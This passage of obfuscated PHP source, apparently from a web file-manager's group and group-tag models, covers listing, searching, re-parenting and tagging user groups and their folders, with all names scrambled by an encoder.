array($ôÒŠ»ƒ[7], $¶Ş‚ıÑ)))->field($ôÒŠ»ƒ[2059])->select(); if (!$…®èì±Ê) { return !1; } $¹²ÃïÛ¾ = array(); foreach ($…®èì±Ê as $ˆ¿„Êüã) { $¹²ÃïÛ¾[] = "\163\x65\154\145\x63\164\x20\147\x72\157\165\x70\111\x44\40\146\162\x6f\155\x20\140\x67\x72\157\x75\160\x60\x20\x77\150\x65\x72\x65\40\160\141\162\145\156\x74\x4c\145\166\x65\154\40\154\151\x6b\145\40\47{$ˆ¿„Êüã[$ôÒŠ»ƒ[593]]}{$ˆ¿„Êüã[$ôÒŠ»ƒ[1963]]}\54\x25\47"; } $¹²ÃïÛ¾ = implode($ôÒŠ»ƒ[2060], $¹²ÃïÛ¾); $…®èì±Ê = $this->query($¹²ÃïÛ¾); if (!$…®èì±Ê) { return array(); } $¶Ş‚ıÑ = array_to_keyvalue($…®èì±Ê, $ôÒŠ»ƒ[12], $ôÒŠ»ƒ[1963]); return array_unique($¶Ş‚ıÑ); } public function listByID($Áèİâ©Æ) { $§–¡ÙïŞ =& $_SERVER[³Ôà×Ó]; if (!$Áèİâ©Æ) { return array(); } $Šßëô“¼ = array($§–¡ÙïŞ[1963] => array($§–¡ÙïŞ[7], $Áèİâ©Æ)); $¾æ—‚ğ = $this->where($Šßëô“¼)->select(); $¾æ—‚ğ = array_sort_keep($¾æ—‚ğ, $§–¡ÙïŞ[1963], $Áèİâ©Æ); $this->_listDataApply($¾æ—‚ğ); return $¾æ—‚ğ; } public function listSearch($‡ê¬êşÛ) { $ó°ÕëÇ™ =& $_SERVER[³Ôà×Ó]; $ééÉ€ñ¾ = trim($‡ê¬êşÛ[$ó°ÕëÇ™[2061]]); $ÆşÔßèŞ = explode($ó°ÕëÇ™[53], $ééÉ€ñ¾); if (!$ééÉ€ñ¾ || count($ÆşÔßèŞ) == 1) { return $this->listSearchNow($‡ê¬êşÛ); } $®áÀóëŸ = array($ó°ÕëÇ™[454] => array()); foreach ($ÆşÔßèŞ as $ÓÄúÆ´Ë) { if (!trim($ÓÄúÆ´Ë)) { continue; } $‡ê¬êşÛ[$ó°ÕëÇ™[2061]] = $ÓÄúÆ´Ë; $º»€¦…º = $this->listSearchNow($‡ê¬êşÛ); $®áÀóëŸ[$ó°ÕëÇ™[454]] = array_merge($®áÀóëŸ[$ó°ÕëÇ™[454]], $º»€¦…º[$ó°ÕëÇ™[454]]); } $®áÀóëŸ[$ó°ÕëÇ™[454]] = array_unique_by_key($®áÀóëŸ[$ó°ÕëÇ™[454]], $ó°ÕëÇ™[1963]); $®áÀóëŸ[$ó°ÕëÇ™[451]] = array($ó°ÕëÇ™[452] => count($®áÀóëŸ[$ó°ÕëÇ™[454]]), $ó°ÕëÇ™[448] => 20, $ó°ÕëÇ™[429] => 1, $ó°ÕëÇ™[453] => 1); return $®áÀóëŸ; } public function listSearchNow($æà¿×ŠÎ) { $Ì¸½Ó¤ß =& $_SERVER[³Ôà×Ó]; $¸‹×¸ôø = trim($æà¿×ŠÎ[$Ì¸½Ó¤ß[2061]]); $ë•µ¸ö = isset($æà¿×ŠÎ[$Ì¸½Ó¤ß[2062]]) ? $æà¿×ŠÎ[$Ì¸½Ó¤ß[2062]] : !1; if (!trim($¸‹×¸ôø)) { return !1; } $¸‹×¸ôø = str_replace($Ì¸½Ó¤ß[2063], $Ì¸½Ó¤ß[2064], $¸‹×¸ôø); $ÖÔË˜˜° = array($Ì¸½Ó¤ß[1963] => array($Ì¸½Ó¤ß[468], "{$¸‹×¸ôø}\x25"), $Ì¸½Ó¤ß[32] => array($Ì¸½Ó¤ß[468], "\45{$¸‹×¸ôø}\45"), $Ì¸½Ó¤ß[1075] => $Ì¸½Ó¤ß[2065]); if ($ë•µ¸ö) { $Â¶ïÎÌä = $this->getInfoSimple($ë•µ¸ö); $éŠ©Ú«ş = $Â¶ïÎÌä[$Ì¸½Ó¤ß[593]] . $ë•µ¸ö . $Ì¸½Ó¤ß[622]; $ÖÔË˜˜° = array($ÖÔË˜˜°, array($Ì¸½Ó¤ß[593] => array($Ì¸½Ó¤ß[468], $éŠ©Ú«ş))); } $ÖÔË˜˜° = $this->parseWhereLike($ÖÔË˜˜°); $æî³‹éƒ = $this->_makeOrder()->where($ÖÔË˜˜°)->selectPage(20); $æî³‹éƒ = $æî³‹éƒ ? $æî³‹éƒ : array($Ì¸½Ó¤ß[454] => array(), $Ì¸½Ó¤ß[451] => array()); if (!$æî³‹éƒ || count($æî³‹éƒ[$Ì¸½Ó¤ß[454]]) < 5 && Input::check($¸‹×¸ôø, $Ì¸½Ó¤ß[394])) { $»œòûÇ… = $this->groupChildrenAll($ë•µ¸ö); $Œ·¿ÎŠº = $this->_searchFromMeta($Ì¸½Ó¤ß[546], $¸‹×¸ôø, 10, $»œòûÇ…); $ÌñŠöøÌ = $this->_searchFromMeta($Ì¸½Ó¤ß[547], $¸‹×¸ôø, 10, $»œòûÇ…); $ßüÓ‹ŠÁ = array_merge($Œ·¿ÎŠº, $ÌñŠöøÌ, $æî³‹éƒ[$Ì¸½Ó¤ß[454]]); $æî³‹éƒ[$Ì¸½Ó¤ß[454]] = array_unique_by_key($ßüÓ‹ŠÁ, $Ì¸½Ó¤ß[1963]); $æî³‹éƒ[$Ì¸½Ó¤ß[451]][$Ì¸½Ó¤ß[452]] = count($æî³‹éƒ[$Ì¸½Ó¤ß[454]]); $æî³‹éƒ[$Ì¸½Ó¤ß[451]][$Ì¸½Ó¤ß[453]] = ceil($æî³‹éƒ[$Ì¸½Ó¤ß[451]][$Ì¸½Ó¤ß[452]] / $æî³‹éƒ[$Ì¸½Ó¤ß[451]][$Ì¸½Ó¤ß[448]]); } $this->_listDataApply($æî³‹éƒ[$Ì¸½Ó¤ß[454]]); return $æî³‹éƒ; } protected function groupChildrenAll($Û°¢Æ•º) { $öÔÇŒ‰ü =& $_SERVER[³Ôà×Ó]; if (!$Û°¢Æ•º) { return !1; } if (!is_array($Û°¢Æ•º)) { $Û°¢Æ•º = array($Û°¢Æ•º); } $ÚÂŠŠ—´ = $Û°¢Æ•º; foreach ($Û°¢Æ•º as $‰œ…ø±) { $ı¾œ³şò = $this->getInfoSimple($‰œ…ø±); $¶šüÆŒ« = array($öÔÇŒ‰ü[593] => array($öÔÇŒ‰ü[468], $ı¾œ³şò[$öÔÇŒ‰ü[593]] . $‰œ…ø± . $öÔÇŒ‰ü[622])); $ÌûÇÒâ = $this->field($öÔÇŒ‰ü[1963])->where($¶šüÆŒ«)->select(); $ÚÂŠŠ—´ = array_merge($ÚÂŠŠ—´, array_to_keyvalue($ÌûÇÒâ, $öÔÇŒ‰ü[12], $öÔÇŒ‰ü[1963])); } return array_unique($ÚÂŠŠ—´); } private function _searchFromMeta($†ËšŞÃˆ, $Ñš‚»Ş, $öÓÍáëÁ, $Ü¿åÄÉ) { $ò‡«‰¼ù =& $_SERVER[³Ôà×Ó]; $Ñš‚»Ş = strtolower($Ñš‚»Ş); $úêŒìÚè = array($ò‡«‰¼ù[97] => $†ËšŞÃˆ, $ò‡«‰¼ù[459] => array($ò‡«‰¼ù[468], "\45{$Ñš‚»Ş}\45")); $úêŒìÚè = $this->parseWhereLike($úêŒìÚè); if ($Ü¿åÄÉ) { $úêŒìÚè[$ò‡«‰¼ù[1963]] = array($ò‡«‰¼ù[7], $Ü¿åÄÉ); } $È¾—¤®¨ = Model($ò‡«‰¼ù[2066])->where($úêŒìÚè)->limit($öÓÍáëÁ)->select(); if (!$È¾—¤®¨) { return array(); } $È¾—¤®¨ = array_to_keyvalue($È¾—¤®¨, $ò‡«‰¼ù[12], $ò‡«‰¼ù[1963]); $¦ŞğØş‡ = $this->where(array($ò‡«‰¼ù[2055] => array($ò‡«‰¼ù[7], $È¾—¤®¨)))->select(); if (!$¦ŞğØş‡) { return array(); } return $¦ŞğØş‡; } protected function _listDataApplyItem($ÀÖ®ŸÛô) { $îî¤‰Ë‘ = array($ÀÖ®ŸÛô); $this->_listDataApply($îî¤‰Ë‘); return $îî¤‰Ë‘[0]; } protected function _listDataApply(&$õÓùŒ·) { $ˆ¡¼àä² =& $_SERVER[³Ôà×Ó]; if (!$õÓùŒ·) { return; } $ƒ¤“»õ = array_to_keyvalue($õÓùŒ·, $ˆ¡¼àä²[12], $ˆ¡¼àä²[1963]); $this->_listAppendChildren($õÓùŒ·); $this->_listAppendChildrenMember($õÓùŒ·); $this->_listAppendMeta($õÓùŒ·, $ƒ¤“»õ); $this->_listAppendParent($õÓùŒ·); $this->_listAppendSourceRoot($õÓùŒ·, $ƒ¤“»õ); } private function _listAppendChildren(&$Ü¦»¤ì®) { $ö¢ñÈæ =& $_SERVER[³Ôà×Ó]; $ ½ÅÚ›ø = array_to_keyvalue($Ü¦»¤ì®, $ö¢ñÈæ[12], $ö¢ñÈæ[1963]); $ ¦çùÏù = array($ö¢ñÈæ[192] => array($ö¢ñÈæ[7], $ ½ÅÚ›ø)); $ïì«Ä›ˆ = array($ö¢ñÈæ[192], $ö¢ñÈæ[2067] => $ö¢ñÈæ[574]); $àëØãğ = $this->field($ïì«Ä›ˆ)->where($ ¦çùÏù)->group($ö¢ñÈæ[192])->select(); $³½­“‡ = array_to_keyvalue($àëØãğ, $ö¢ñÈæ[192], $ö¢ñÈæ[574]); foreach ($Ü¦»¤ì® as &$–¿µ×«Í) { $æ«çŠˆ‹ = $–¿µ×«Í[$ö¢ñÈæ[1963]]; $–¿µ×«Í[$ö¢ñÈæ[2068]] = isset($³½­“‡[$æ«çŠˆ‹]) ? intval($³½­“‡[$æ«çŠˆ‹]) : !1; } unset($–¿µ×«Í); } private function _listAppendChildrenMember(&$¼—§¿¬Ş) { $±¥òŒÉ© =& $_SERVER[³Ôà×Ó]; $ ¯öÀ± = array_to_keyvalue($¼—§¿¬Ş, $±¥òŒÉ©[12], $±¥òŒÉ©[1963]); $®¡àÉî— = array($±¥òŒÉ©[1963] => array($±¥òŒÉ©[7], $ ¯öÀ±)); $Ğ¹²Œœ€ = array($±¥òŒÉ©[1963], $±¥òŒÉ©[2067] => $±¥òŒÉ©[574]); $™˜—Â½ = Model($±¥òŒÉ©[2057])->field($Ğ¹²Œœ€)->where($®¡àÉî—)->group($±¥òŒÉ©[1963])->select(); $ÎÉØùÍ = array_to_keyvalue($™˜—Â½, $±¥òŒÉ©[1963], $±¥òŒÉ©[574]); foreach ($¼—§¿¬Ş as &$ Éùµ –) { $óè ¨« = $ Éùµ –[$±¥òŒÉ©[1963]]; $ Éùµ –[$±¥òŒÉ©[2069]] = isset($ÎÉØùÍ[$óè ¨«]) ? intval($ÎÉØùÍ[$óè ¨«]) : !1; } unset($ Éùµ –); } private function _listAppendMeta(&$Æ•†¢÷Î, $Áï©à¤ñ) { $¼ùÇÔ°† =& $_SERVER[³Ôà×Ó]; $¹ñãÚÉ = array($¼ùÇÔ°†[1963] => array($¼ùÇÔ°†[7], $Áï©à¤ñ)); $èºÊ¬’ = Model($¼ùÇÔ°†[2056])->where($¹ñãÚÉ)->select(); $èºÊ¬’ = array_to_keyvalue_group($èºÊ¬’, $¼ùÇÔ°†[1963]); foreach ($èºÊ¬’ as &$šğˆÔ¬ú) { $šğˆÔ¬ú = array_to_keyvalue($šğˆÔ¬ú, $¼ùÇÔ°†[97], $¼ùÇÔ°†[459]); } unset($šğˆÔ¬ú); foreach ($Æ•†¢÷Î as &$Œî¬Îøõ) { $Œî¬Îøõ[$¼ùÇÔ°†[548]] = array(); if (isset($èºÊ¬’[$Œî¬Îøõ[$¼ùÇÔ°†[1963]]])) { $Œî¬Îøõ[$¼ùÇÔ°†[548]] = $èºÊ¬’[$Œî¬Îøõ[$¼ùÇÔ°†[1963]]]; } } unset($Œî¬Îøõ); } protected function parentLevelArray($ı”ô¢è) { $«ª³†âš =& $_SERVER[³Ôà×Ó]; $ı”ô¢è = explode($«ª³†âš[50], trim($ı”ô¢è, $«ª³†âš[50])); $ı”ô¢è = array_remove_value($ı”ô¢è, $«ª³†âš[228]); return $ı”ô¢è; } protected function parentInGroup($æåæ›©“, $Û¤ÚşÕÄ) { $Æâ®ë¼™ =& $_SERVER[³Ôà×Ó]; $ÎùîÀì = $this->getInfoSimple($æåæ›©“); if (!$ÎùîÀì) { return !0; } $êæŞÑÕ = $this->parentLevelArray($ÎùîÀì[$Æâ®ë¼™[593]]); $êæŞÑÕ[] = $æåæ›©“; foreach ($êæŞÑÕ as $æåæ›©“) { if (in_array($æåæ›©“ . $Æâ®ë¼™[12], $Û¤ÚşÕÄ)) { return !0; } } return !1; } private function _listAppendParent(&$Ñéº€±) { $‹Ù§‡â• =& $_SERVER[³Ôà×Ó]; $Óµâ˜Ë‡ = array(); foreach ($Ñéº€± as &$Å¢¢Æ±) { $Óµâ˜Ë‡[$Å¢¢Æ±[$‹Ù§‡â•[1963]]] = $Å¢¢Æ±[$‹Ù§‡â•[32]]; $şÁöµ‡ = $this->parentLevelArray($Å¢¢Æ±[$‹Ù§‡â•[593]]); foreach ($şÁöµ‡ as $÷Ô—§îª) { if (!isset($Óµâ˜Ë‡[$÷Ô—§îª])) { $Óµâ˜Ë‡[$÷Ô—§îª] = 0; } } } unset($Å¢¢Æ±); foreach ($Óµâ˜Ë‡ as $…·ã‘š‚ => $Ù²å±ÎÄ) { if ($Ù²å±ÎÄ) { continue; } $Ê×öŒº„ = $this->getInfoSimple($…·ã‘š‚); $Óµâ˜Ë‡[$…·ã‘š‚] = $Ê×öŒº„[$‹Ù§‡â•[32]]; } $Ÿ ¤Å”µ = $GLOBALS[$‹Ù§‡â•[6]][$‹Ù§‡â•[92]][$‹Ù§‡â•[2070]]; if (KodUser::isRoot()) { $Ÿ ¤Å”µ = !1; } foreach ($Ñéº€± as &$Å¢¢Æ±) { $şÁöµ‡ = $this->parentLevelArray($Å¢¢Æ±[$‹Ù§‡â•[593]]); $àù›ÏïÖ = $‹Ù§‡â•[12]; foreach ($şÁöµ‡ as $…·ã‘š‚ => $÷Ô—§îª) { if ($Ÿ ¤Å”µ && $…·ã‘š‚ == 0) { continue; } $àù›ÏïÖ .= $Óµâ˜Ë‡[$÷Ô—§îª] . $‹Ù§‡â•[8]; } if ($şÁöµ‡) { $àù›ÏïÖ .= $Å¢¢Æ±[$‹Ù§‡â•[32]]; } $Å¢¢Æ±[$‹Ù§‡â•[598]] = str_replace($‹Ù§‡â•[601], $‹Ù§‡â•[8], $àù›ÏïÖ); } unset($Å¢¢Æ±); } private function _listAppendSourceRoot(&$´—ğ¦òš, $øØš®¿) { $·é£Ñ‚Ê =& $_SERVER[³Ôà×Ó]; $Ò’ÌÆ‚ = Model($·é£Ñ‚Ê[899])->listSourceRoot(SourceModel::TYPE_GROUP, $øØš®¿); $Ò’ÌÆ‚ = array_to_keyvalue($Ò’ÌÆ‚, $·é£Ñ‚Ê[578]); $Ò’ÌÆ‚ = array_remove_key($Ò’ÌÆ‚, $·é£Ñ‚Ê[578]); foreach ($´—ğ¦òš as &$áÖ²Ê²À) { $áÖ²Ê²À[$·é£Ñ‚Ê[90]] = $Ò’ÌÆ‚[$áÖ²Ê²À[$·é£Ñ‚Ê[1963]]] ? $Ò’ÌÆ‚[$áÖ²Ê²À[$·é£Ñ‚Ê[1963]]] : array(); } unset($áÖ²Ê²À); } protected function groupMerge($€›ˆÊ¾—) { $€›ˆÊ¾— = array_values(array_unique($€›ˆÊ¾—)); $Ö¶‘¢¢ï = array(); for ($¥úæñÍ“ = 0; $¥úæñÍ“ < count($€›ˆÊ¾—); $¥úæñÍ“++) { $á§Ò  = !1; for ($ÍÒ¼ÛÎé = 0; $ÍÒ¼ÛÎé < count($€›ˆÊ¾—); $ÍÒ¼ÛÎé++) { if ($¥úæñÍ“ == $ÍÒ¼ÛÎé) { continue; } if ($this->isParentOf($€›ˆÊ¾—[$ÍÒ¼ÛÎé], $€›ˆÊ¾—[$¥úæñÍ“])) { $á§Ò  = !0; break; } } if (!$á§Ò ) { $Ö¶‘¢¢ï[] = $€›ˆÊ¾—[$¥úæñÍ“]; } } return $Ö¶‘¢¢ï; } protected function isParentOf($úÎàæ¶™, $‡Áİùäğ) { $È·ä²É =& $_SERVER[³Ôà×Ó]; if (!$úÎàæ¶™ || !$‡Áİùäğ || $úÎàæ¶™ == $‡Áİùäğ) { return !1; } $Í‡“èª = $this->getInfoSimple($úÎàæ¶™); $Ø¿Òäú¨ = $this->getInfoSimple($‡Áİùäğ); $”Æ€ˆÅ = $Í‡“èª[$È·ä²É[593]] . $úÎàæ¶™ . $È·ä²É[50]; if (substr($Ø¿Òäú¨[$È·ä²É[593]], 0, strlen($”Æ€ˆÅ)) == $”Æ€ˆÅ) { return !0; } return !1; } public function groupShowRoot($—“å¿’˜, $Ú§†ºğé = false) { $—é×°Ü¦ =& $_SERVER[³Ôà×Ó]; $¦¾ÉŸÊ = $this->getInfo($—“å¿’˜); if (!$¦¾ÉŸÊ) { return array(); } $‡®üª¼ = $this->parentLevelArray($¦¾ÉŸÊ[$—é×°Ü¦[593]]); $í”éşØú = array($—“å¿’˜); if (count($‡®üª¼) == 0) { return $í”éşØú; } if ($Ú§†ºğé && count($‡®üª¼) == 1) { return $í”éşØú; } if (!$¦¾ÉŸÊ[$—é×°Ü¦[548]] || !isset($¦¾ÉŸÊ[$—é×°Ü¦[548]][$—é×°Ü¦[2053]]) || $¦¾ÉŸÊ[$—é×°Ü¦[548]][$—é×°Ü¦[2053]] == $—é×°Ü¦[851]) { return $this->groupShowRoot($‡®üª¼[count($‡®üª¼) - 1], $Ú§†ºğé); } if ($¦¾ÉŸÊ[$—é×°Ü¦[548]][$—é×°Ü¦[2053]] == $—é×°Ü¦[442]) { $«¶°ÀÙ² = explode($—é×°Ü¦[50], $¦¾ÉŸÊ[$—é×°Ü¦[548]][$—é×°Ü¦[2054]]); if ($«¶°ÀÙ²) { $í”éşØú = array_merge($í”éşØú, $«¶°ÀÙ²); } } return $í”éşØú; } protected function resetParentLevel() { $‘İ›Ëî© =& $_SERVER[³Ôà×Ó]; $«ø¨€ÂÈ = $‘İ›Ëî©[1963]; $£„íĞ– = $this->select(); $£„íĞ– = array_to_keyvalue($£„íĞ–, $«ø¨€ÂÈ); foreach ($£„íĞ– as $Úéõ¿Î¨) { $ÑŒÑºÀ = $Úéõ¿Î¨; $”Ö¯Î·† = array(); while ($ÑŒÑºÀ[$‘İ›Ëî©[192]] != 0) { $”Ö¯Î·†[] = $ÑŒÑºÀ[$‘İ›Ëî©[192]]; $ÑŒÑºÀ = $£„íĞ–[$ÑŒÑºÀ[$‘İ›Ëî©[192]]]; } $”Ö¯Î·†[] = 0; $”Ö¯Î·† = $‘İ›Ëî©[50] . implode($‘İ›Ëî©[50], array_reverse($”Ö¯Î·†)) . $‘İ›Ëî©[50]; $this->setNamePinyin($Úéõ¿Î¨[$«ø¨€ÂÈ], $Úéõ¿Î¨[$‘İ›Ëî©[32]]); $this->where(array($«ø¨€ÂÈ => $Úéõ¿Î¨[$«ø¨€ÂÈ]))->save(array($‘İ›Ëî©[661] => $”Ö¯Î·†)); } return $£„íĞ–; } public function groupNameAuto($¨âÇÙÖ , $¸Æ³ÙÉ¼) { $¹ÄÔ½¬ =& $_SERVER[³Ôà×Ó]; $¨¿¬— = $this->where(array($¹ÄÔ½¬[486] => $¨âÇÙÖ ))->getField($¹ÄÔ½¬[32], !0); if (!$¨¿¬— || !in_array($¸Æ³ÙÉ¼, $¨¿¬—)) { return $¸Æ³ÙÉ¼; } for ($òÄ°µ³ = 1; $òÄ°µ³ <= count($¨¿¬—) + 1; $òÄ°µ³++) { $•Ç£Ñ‰‡ = $¸Æ³ÙÉ¼ . "\50{$òÄ°µ³}\x29"; if (!in_array($•Ç£Ñ‰‡, $¨¿¬—)) { return $•Ç£Ñ‰‡; } } } public function groupSwitch($§—ùÑÕº, $¥µ„‹ÒŞ) { $—®’›Ìæ =& $_SERVER[³Ôà×Ó]; $áîé¸Á‚ = array($—®’›Ìæ[1963] => array($—®’›Ìæ[7], array($§—ùÑÕº, $¥µ„‹ÒŞ))); $µçŞÓàõ = $this->where($áîé¸Á‚)->select(); $µçŞÓàõ = array_to_keyvalue($µçŞÓàõ, $—®’›Ìæ[1963]); if (!isset($µçŞÓàõ[$§—ùÑÕº]) || !isset($µçŞÓàõ[$¥µ„‹ÒŞ]) || $µçŞÓàõ[$§—ùÑÕº][$—®’›Ìæ[192]] == 0) { return !1; } $áîé¸Á‚ = array($—®’›Ìæ[1963] => $§—ùÑÕº); $ÆÁß÷ªÙ = Model($—®’›Ìæ[2057])->where($áîé¸Á‚)->select(); if (!$ÆÁß÷ªÙ) { $ÆÁß÷ªÙ = array(); } foreach ($ÆÁß÷ªÙ as $™İÊ¹ğ•) { $Í‰’Ç” = $™İÊ¹ğ•[$—®’›Ìæ[1765]]; $áîé¸Á‚ = array($—®’›Ìæ[1765] => $Í‰’Ç”, $—®’›Ìæ[1963] => $¥µ„‹ÒŞ); $©·¾«Çî = Model($—®’›Ìæ[2057])->where($áîé¸Á‚)->find(); if (!$©·¾«Çî) { $ã‡ÇıÂ = array($¥µ„‹ÒŞ => $™İÊ¹ğ•[$—®’›Ìæ[2071]]); Model($—®’›Ìæ[607])->userGroupAdd($Í‰’Ç”, $ã‡ÇıÂ); } Model($—®’›Ìæ[607])->userGroupRemove($Í‰’Ç”, $§—ùÑÕº); } $áîé¸Á‚ = array($—®’›Ìæ[190] => 2, $—®’›Ìæ[192] => 0, $—®’›Ìæ[494] => 1, $—®’›Ìæ[578] => array($—®’›Ìæ[7], array($§—ùÑÕº, $¥µ„‹ÒŞ))); $ú¹Í÷ˆ¬ = Model($—®’›Ìæ[899])->where($áîé¸Á‚)->field($—®’›Ìæ[2072])->select(); $ú¹Í÷ˆ¬ = array_to_keyvalue($ú¹Í÷ˆ¬, $—®’›Ìæ[578], $—®’›Ìæ[193]); $À¼Àåàã = !empty($ú¹Í÷ˆ¬[$§—ùÑÕº]) ? $ú¹Í÷ˆ¬[$§—ùÑÕº] : !1; if ($À¼Àåàã) { if (!$ú¹Í÷ˆ¬[$¥µ„‹ÒŞ]) { $ú¹Í÷ˆ¬[$¥µ„‹ÒŞ] = Model($—®’›Ìæ[899])->groupRootAdd($¥µ„‹ÒŞ); } $ŸËÀ³Åß = $ú¹Í÷ˆ¬[$¥µ„‹ÒŞ]; $áîé¸Á‚ = array($—®’›Ìæ[192] => $À¼Àåàã); $ú¹Í÷ˆ¬ = Model($—®’›Ìæ[899])->where($áîé¸Á‚)->field($—®’›Ìæ[2073])->select(); if (!$ú¹Í÷ˆ¬) { $ú¹Í÷ˆ¬ = array(); } Model($—®’›Ìæ[899])->moveClearAuth = !1; foreach ($ú¹Í÷ˆ¬ as $‚€·İÆÉ) { $œÆ†”Û» = $‚€·İÆÉ[$—®’›Ìæ[494]] == $—®’›Ìæ[91] ? REPEAT_RENAME_FOLDER : REPEAT_RENAME; Model($—®’›Ìæ[899])->move($‚€·İÆÉ[$—®’›Ìæ[193]], $ŸËÀ³Åß, $œÆ†”Û»); } Model($—®’›Ìæ[899])->moveClearAuth = !0; $áîé¸Á‚ = array($—®’›Ìæ[190] => 2, $—®’›Ìæ[578] => $§—ùÑÕº); $ÆîÇğ = array($—®’›Ìæ[578] => $¥µ„‹ÒŞ); Model($—®’›Ìæ[2074])->where($áîé¸Á‚)->save($ÆîÇğ); Model($—®’›Ìæ[2075])->where($áîé¸Á‚)->save($ÆîÇğ); } $this->_changeChildLevel($µçŞÓàõ[$§—ùÑÕº], $µçŞÓàõ[$¥µ„‹ÒŞ], !0); $this->where(array($—®’›Ìæ[192] => $§—ùÑÕº))->save(array($—®’›Ìæ[192] => $¥µ„‹ÒŞ)); $this->_clearChildrenCache($µçŞÓàõ[$¥µ„‹ÒŞ]); return !0; } } class GroupTagModel extends ModelBase { protected $tableName = "\x75\163\x65\x72\x5f\146\141\x76"; protected function cacheFunctionAlias($ï­ä¾ã) { $şÄÖ²Èå =& $_SERVER[³Ôà×Ó]; return array($şÄÖ²Èå[2076] => array($ï­ä¾ã[0], $şÄÖ²Èå[2077]), $şÄÖ²Èå[2078] => array($ï­ä¾ã[0], $şÄÖ²Èå[2079])); } protected function get($—îÇÅÚ) { $Œ’ è¦ƒ =& $_SERVER[³Ôà×Ó]; $»£‡ÄË‚ = Model($Œ’ è¦ƒ[594])->metaGet($—îÇÅÚ, $Œ’ è¦ƒ[2080]); $¤½½üÄà = json_decode($»£‡ÄË‚, !0); return $¤½½üÄà ? $¤½½üÄà : array($Œ’ è¦ƒ[2081] => $Œ’ è¦ƒ[91], $Œ’ è¦ƒ[454] => array()); } protected function set($ª˜²î¥à, $×í¶ğ¸Ô) { $íôŞõË =& $_SERVER[³Ôà×Ó]; $×í¶ğ¸Ô = $×í¶ğ¸Ô ? $×í¶ğ¸Ô : array($íôŞõË[2081] => $íôŞõË[91], $íôŞõË[454] => array()); return Model($íôŞõË[594])->metaSet($ª˜²î¥à, $íôŞõË[2080], json_encode($×í¶ğ¸Ô)); } protected function getByTagID($¦’á¾‡‰, $îëîı) { $øÜ¼æ´µ =& $_SERVER[³Ôà×Ó]; if (!$¦’á¾‡‰ || !$îëîı) { return !1; } if (!Model($øÜ¼æ´µ[594])->getInfoSimple($¦’á¾‡‰)) { return !1; } $Â«¥”¦Ù = $this->get($¦’á¾‡‰); if (!$Â«¥”¦Ù || !isset($Â«¥”¦Ù[$øÜ¼æ´µ[454]])) { return !1; } $ñ„¦…Ì = array_find_by_field($Â«¥”¦Ù[$øÜ¼æ´µ[454]], $øÜ¼æ´µ[484], $îëîı); return is_array($ñ„¦…Ì) ? $ñ„¦…Ì : !1; } public function listSource($ÕÓ•Éğ, $œ…“‡Î¥) { $’´Ğ¬‰ü =& $_SERVER[³Ôà×Ó]; if ($œ…“‡Î¥ && !is_array($œ…“‡Î¥)) { $œ…“‡Î¥ = array($œ…“‡Î¥); } $õš·¡ù³ = $this->listData($ÕÓ•Éğ); $ğ”èæ©Š = array(); foreach ($õš·¡ù³ as $³±â†) { $ şêˆÈ = $³±â†[$’´Ğ¬‰ü[87]]; if (!$ şêˆÈ) { continue; } if (!isset($ğ”èæ©Š[$ şêˆÈ])) { $ğ”èæ©Š[$ şêˆÈ] = array(); } $ğ”èæ©Š[$ şêˆÈ][] = $³±â†[$’´Ğ¬‰ü[509]]; } $äœ‹––º = array(); foreach ($ğ”èæ©Š as $¢ÔõóƒÏ => $ùëµ¶áµ) { $İ…ÄÛğ = !0; if (!$œ…“‡Î¥) { $äœ‹––º[] = $¢ÔõóƒÏ; continue; } foreach ($œ…“‡Î¥ as $«µ·’³Š) { if (!in_array($«µ·’³Š, $ùëµ¶áµ)) { $İ…ÄÛğ = !1; break; } } if ($İ…ÄÛğ) { $äœ‹––º[] = $¢ÔõóƒÏ; } } if (!$äœ‹––º) { return array(); } $¶º½ş½ú = array($’´Ğ¬‰ü[500] => array($’´Ğ¬‰ü[501], $äœ‹––º), $’´Ğ¬‰ü[578] => $ÕÓ•Éğ, $’´Ğ¬‰ü[190] => SourceModel::TYPE_GROUP); $Œ”Ê—şá = Model($’´Ğ¬‰ü[1414])->listSource($¶º½ş½ú); if (!$Œ”Ê—şá || count($äœ‹––º) == $Œ”Ê—şá[$’´Ğ¬‰ü[451]][$’´Ğ¬‰ü[452]]) { return $Œ”Ê—şá; } $ƒ¯§€Á¸ = array(); $„ß»¼‚ø = array_to_keyvalue($Œ”Ê—şá[$’´Ğ¬‰ü[85]], $’´Ğ¬‰ü[12], $’´Ğ¬‰ü[193]); $Î¹Ÿ­Ù = array_to_keyvalue($Œ”Ê—şá[$’´Ğ¬‰ü[86]], $’´Ğ¬‰ü[12], $’´Ğ¬‰ü[193]); $ª§˜°÷« = array_merge($Î¹Ÿ­Ù, $„ß»¼‚ø); foreach ($äœ‹––º as $ şêˆÈ) { if (!in_array($ şêˆÈ, $ª§˜°÷«)) { $ƒ¯§€Á¸[] = $ şêˆÈ; } } if ($ƒ¯§€Á¸) { $this->removeBySource($ÕÓ•Éğ, $ƒ¯§€Á¸); } return $Œ”Ê—şá; } protected function listData($†äòß³Ú) { $—à×µû· =& $_SERVER[³Ôà×Ó]; $€Êå°¤ = array($—à×µû·[1756] => 0, $—à×µû·[566] => array($—à×µû·[2082], 0), $—à×µû·[505] => $—à×µû·[2083] . $†äòß³Ú); $é àÜ„² = $—à×µû·[2084]; $‡ü†¦Â» = $this->field($é àÜ„²)->where($€Êå°¤)->order($—à×µû·[2085])->select(); return $‡ü†¦Â» ? $‡ü†¦Â» : array(); } protected function addToTag($ÖÜÁÆ¤õ, $¡Õ•×æ, $ÊÓ®­Û¼) { $¯”¤ş¡Æ =& $_SERVER[³Ôà×Ó]; if (!$this->getByTagID($ÖÜÁÆ¤õ, $ÊÓ®­Û¼) || !$¡Õ•×æ) { return !1; } if (!Model($¯”¤ş¡Æ[899])->pathInfo($¡Õ•×æ)) { return !1; } $â©»—‘ = array($¯”¤ş¡Æ[1756] => 0, $¯”¤ş¡Æ[566] => $ÊÓ®­Û¼, $¯”¤ş¡Æ[504] => $¡Õ•×æ, $¯”¤ş¡Æ[505] => $¯”¤ş¡Æ[2086] . $ÖÜÁÆ¤õ, $¯”¤ş¡Æ[503] => $¯”¤ş¡Æ[12], $¯”¤ş¡Æ[1967] => 0); if ($this->where($â©»—‘)->find()) { return !1; } return $this->add($â©»—‘); } protected function removeFromTag($ø„ÏµÛÚ, $êŠúÃ…ç, $«Ãò±íæ) { $üÃª¼ =& $_SERVER[³Ôà×Ó]; if (!$this->getByTagID($ø„ÏµÛÚ, $«Ãò±íæ) || !$êŠúÃ…ç) { return !1; } if (is_array($êŠúÃ…ç)) { $êŠúÃ…ç = array($üÃª¼[7], $êŠúÃ…ç); } $ 